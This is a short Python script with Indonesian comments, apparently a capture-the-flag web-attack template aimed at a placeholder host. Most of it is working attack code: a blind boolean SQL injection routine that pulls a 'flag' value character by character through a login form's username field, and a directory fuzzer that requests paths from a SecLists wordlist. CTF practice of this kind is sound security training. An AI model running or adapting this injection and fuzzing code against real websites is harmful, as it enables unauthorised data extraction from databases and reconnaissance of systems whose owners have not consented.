#!/usr/bin/env python3
# Skeleton serangan web pakai requests (session, blind extraction, fuzzing).
import requests, string, sys

BASE = 'http://host:port'
s = requests.Session()
s.headers.update({'User-Agent': 'ctf'})
# s.proxies = {'http': 'http://127.0.0.1:8080'}   # lewat Burp buat debug

def get(path, **kw):  return s.get(BASE+path, **kw)
def post(path, **kw): return s.post(BASE+path, **kw)

# --- contoh: blind boolean SQLi char-by-char ---
def blind_sqli():
    charset = string.printable
    found = ''
    while True:
        for c in charset:
            payload = f"' OR (SELECT substr(flag,{len(found)+1},1) FROM t)='{c}'-- -"
            r = post('/login', data={'u': payload, 'p': 'x'})
            if 'Welcome' in r.text:     # kondisi 'true'
                found += c; print(found); break
        else:
            break
    return found

# --- contoh: fuzz param / dir ---
def fuzz():
    for w in open('/usr/share/seclists/Discovery/Web-Content/common.txt'):
        w = w.strip()
        r = get('/'+w)
        if r.status_code not in (404,):
            print(r.status_code, w)

if __name__ == '__main__':
    print(get('/').text[:500])
